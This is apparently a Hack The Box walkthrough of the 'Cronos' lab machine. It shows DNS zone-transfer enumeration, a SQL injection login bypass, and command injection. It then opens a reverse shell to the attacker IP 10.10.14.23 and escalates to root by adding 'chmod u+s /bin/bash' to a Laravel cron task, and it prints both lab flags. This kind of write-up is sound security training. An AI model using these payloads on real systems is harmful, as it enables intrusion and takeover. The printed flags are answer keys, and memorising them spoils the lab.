{"title":"HTB - Cronos","slug":"Cronos","html":"<h1 id=\"cronos---10101013\">Cronos - 10.10.10.13</h1>\n<h1 id=\"enumeration\">Enumeration</h1>\n<h2 id=\"nmap\">Nmap</h2>\n<pre class=\"language-bash\"><code class=\"language-bash\">nmap -sC -sV -oA nmap/initial 10.10.10.13</code></pre><pre class=\"language-bash\"><code class=\"language-bash\"># Nmap 7.91 scan initiated Thu Apr 29 13:00:15 2021 as: nmap -sC -sV -T4 -oA nmap/initial 10.10.10.13\nNmap scan report for 10.10.10.13\nHost is up (0.24s latency).\nNot shown: 997 filtered ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)\n|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)\n|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)\n53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: 9.10.3-P4-Ubuntu\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Thu Apr 29 13:00:45 2021 -- 1 IP address (1 host up) scanned in 30.63 seconds</code></pre><h2 id=\"website\">Website</h2>\n<p>Going to the <a target=\"_blank\" rel=\"nofollow\" href=\"http://10.10.10.13\">http://10.10.10.13</a>, it is a default apache webpage.</p>\n<p><img src=\"Cronos.assets/image-20210429134408046.png\" alt=\"\"></p>\n<h2 id=\"dns-enumeration\">DNS Enumeration</h2>\n<p>Since port 53 is open and dns is setup, the machine could have some virtual host routing setup.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">$ nslookup\n# the server is setup, this will define where the queries are sent\n> server 10.10.10.13 \nDefault server: 10.10.10.13\nAddress: 10.10.10.13#53\n# the server is told to query itself on localhost\n> 127.0.0.1\n1.0.0.127.in-addr.arpa  name = localhost.\n# the server is told to query the public ip address\n> 10.10.10.13\n13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.</code></pre><p>A dns entry is revealed with a subdomain.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">$ dig axfr cronos.htb @10.10.10.13 \n\n; &lt;&lt;>> DiG 9.16.13-Debian &lt;&lt;>> axfr cronos.htb @10.10.10.13\n;; global options: +cmd\ncronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800\ncronos.htb.             604800  IN      NS      ns1.cronos.htb.\ncronos.htb.             604800  IN      A       10.10.10.13\nadmin.cronos.htb.       604800  IN      A       10.10.10.13\nns1.cronos.htb.         604800  IN      A       10.10.10.13\nwww.cronos.htb.         604800  IN      A       10.10.10.13\ncronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800\n;; Query time: 788 msec\n;; SERVER: 10.10.10.13#53(10.10.10.13)\n;; WHEN: Thu Apr 29 13:53:24 EDT 2021\n;; XFR size: 7 records (messages 1, bytes 203)</code></pre><p>Several domains are revealed when looking for dns zone transfers</p>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"\">cronos.htb</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"\">www.cronos.htb</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"\">admin.cronos.htb</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"\">ns1.cronos.htb</a></li>\n</ul>\n<p>The above domains are added to the <strong>/etc/hosts</strong> file.</p>\n<p><strong>ns1.cronos.htb</strong></p>\n<p><img src=\"Cronos.assets/image-20210429141923272.png\" alt=\"\"></p>\n<p><strong><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.cronos.htb\">www.cronos.htb</a></strong>, <strong>cronos.htb</strong></p>\n<p><img src=\"Cronos.assets/image-20210429141623055.png\" alt=\"\"></p>\n<p>admin.cronos.htb</p>\n<p><img src=\"Cronos.assets/image-20210429142110168.png\" alt=\"\"></p>\n<p>After trying basic SQl injection <code>admin&#39; or 1=1 -- -</code> in the login page, the attacker can bypass the login.</p>\n<p><img src=\"Cronos.assets/image-20210429142346516.png\" alt=\"\"></p>\n<p>The attacker can execute code when trying command injection payload <code>;ls</code> in the input field.</p>\n<p><img src=\"Cronos.assets/image-20210429142725304.png\" alt=\"\"></p>\n<h1 id=\"exploitation\">Exploitation</h1>\n<h3 id=\"getting-a-reverse-shell\">Getting a reverse shell</h3>\n<p>Intercepting the post request on burp, commands can be easily executed on the server. </p>\n<p><img src=\"Cronos.assets/image-20210429145546248.png\" alt=\"\"></p>\n<p>The tools used here to generate quick  reverse shell is called <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mthbernardes/rsg\">rsg or reverse shell generator</a></p>\n<pre class=\"language-bash\"><code class=\"language-bash\"># generates payload and as well as listens on the specified port\nrsg 10.10.14.23 8888 bash</code></pre><p>The attacker then uploads the shell.php and sets up <strong>nc</strong> to listen for an incoming connection on port <strong>8888</strong>.</p>\n<p>The command is first url encoded before sending it to the server.</p>\n<p><img src=\"Cronos.assets/image-20210429150112820.png\" alt=\"\"></p>\n<p>The reverse shell is then stabilised using the following commands.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">which python3 # to know which python version exists\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' # gets a proper tty shell\n# the shell is then backgrounded using ctrl+z\nstty raw -echo # this is executed on the attackers machine\n# then press fg to resume the tty shell\nexport TERM=xterm # after setting the terminal type, the screen can now be cleared\nstty rows 42 cols 172 # sets the size for the tty shell</code></pre><h1 id=\"post-exploitation\">Post Exploitation</h1>\n<h2 id=\"privilege-escalation-to-root\">Privilege Escalation to Root</h2>\n<p>After running LinEnum.sh from <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/rebootuser/LinEnum\">https://github.com/rebootuser/LinEnum</a>, it is known that a cronjob is running on the server.</p>\n<p><img src=\"Cronos.assets/image-20210429153151953.png\" alt=\"\"></p>\n<h3 id=\"vulnerability-explanation\"><strong>Vulnerability Explanation:</strong></h3>\n<p>Since the cronjob is ran as root, if the attacker can control a schedule task, it will be ran with root privileges. Upon researching, the file <strong>/var/www/laravel/app/Console/Kernel.php</strong> needs to edited to add a task.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">find / -name \"Kernel.php\" -ls 2>/dev/null</code></pre><p>The file is owned by the user <strong>www-data</strong> and the current shell is as that specific user. Hence the attacker can modify the file as needed.</p>\n<p><img src=\"Cronos.assets/image-20210429153956388.png\" alt=\"\"></p>\n<p>source: <a target=\"_blank\" rel=\"nofollow\" href=\"https://tutsforweb.com/how-to-set-up-task-scheduling-cron-job-in-laravel/\">https://tutsforweb.com/how-to-set-up-task-scheduling-cron-job-in-laravel/</a></p>\n<p><img src=\"Cronos.assets/image-20210429153632588.png\" alt=\"\"></p>\n<p>source: <a target=\"_blank\" rel=\"nofollow\" href=\"https://vegibit.com/scheduling-commands-and-tasks-in-laravel/\">https://vegibit.com/scheduling-commands-and-tasks-in-laravel/</a></p>\n<p><img src=\"Cronos.assets/image-20210429154116336.png\" alt=\"\"></p>\n<pre class=\"language-php\"><code class=\"language-php\">    protected function schedule(Schedule $schedule)\n    {\n        // $schedule->command('inspire')\n        //          ->hourly();\n        $schedule->exec('chmod u+s /bin/bash')->everyMinute();\n    }</code></pre><p>After the setuid of <strong>/bin/bash</strong> when executing <code>bash -p</code>, the attacker can have the shell of the current user have an effective user ID or euid of root.</p>\n<p><img src=\"Cronos.assets/image-20210429161104987.png\" alt=\"\"></p>\n<h3 id=\"usertxt\">User.txt</h3>\n<pre class=\"language-bash\"><code class=\"language-bash\">find /home -type f -ls 2>/dev/null | grep user</code></pre><p><strong>User.txt</strong> can be found in the home directory of <strong>noulis</strong>.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /home/noulis/user.txt</code></pre><p><img src=\"Cronos.assets/image-20210429161454130.png\" alt=\"\"></p>\n<blockquote>\n<p>user.txt flag: <code>51d236438b333970dbba7dc3089be33b</code></p>\n</blockquote>\n<h3 id=\"roottxt\">Root.txt</h3>\n<p>the <strong>root.txt</strong> file is always located in <strong>/root/</strong></p>\n<pre class=\"language-bash\"><code class=\"language-bash\">cat /root/root.txt</code></pre><p><img src=\"Cronos.assets/image-20210429161557939.png\" alt=\"\"></p>\n<blockquote>\n<p>root.txt flag: <code>1703b8a3c9a8dde879942c79d02fd3a0</code></p>\n</blockquote>\n","date":"2021-04-29","excerpt":"","printDate":"April 29, 2021","printReadingTime":"4 min read"}